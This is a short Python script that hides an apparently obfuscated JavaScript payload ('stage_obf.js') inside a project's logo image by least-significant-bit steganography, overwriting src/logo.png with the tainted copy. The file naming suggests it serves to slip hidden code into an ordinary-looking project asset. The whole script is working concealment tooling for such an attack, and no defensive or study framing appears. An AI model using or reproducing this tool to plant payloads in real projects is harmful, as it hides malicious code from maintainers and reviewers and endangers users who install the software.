from pathlib import Path
from PIL import Image

MARKER = b"IEND"

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
PAYLOAD = ROOT / "payload" / "stage_obf.js"

LOGO_IN = SRC / "logo_clean.png"
LOGO_OUT = SRC / "logo.png"

def bytes_to_bits(data: bytes):
    for byte in data:
        for i in range(7, -1, -1):
            yield (byte >> i) & 1

def hide_lsb(image_path, payload_path, output_path):
    img = Image.open(image_path).convert("RGBA")
    pixels = bytearray(img.tobytes())

    payload = payload_path.read_bytes() + MARKER
    bits = list(bytes_to_bits(payload))

    if len(bits) > len(pixels):
        raise ValueError("Payload is too large for this image")

    for i, bit in enumerate(bits):
        pixels[i] = (pixels[i] & 0xFE) | bit

    new_img = Image.frombytes("RGBA", img.size, bytes(pixels))
    new_img.save(output_path, "PNG")

    print(f"[+] hidden {len(payload)} bytes")
    print(f"[+] wrote {output_path}")

if __name__ == "__main__":
    hide_lsb(LOGO_IN, PAYLOAD, LOGO_OUT)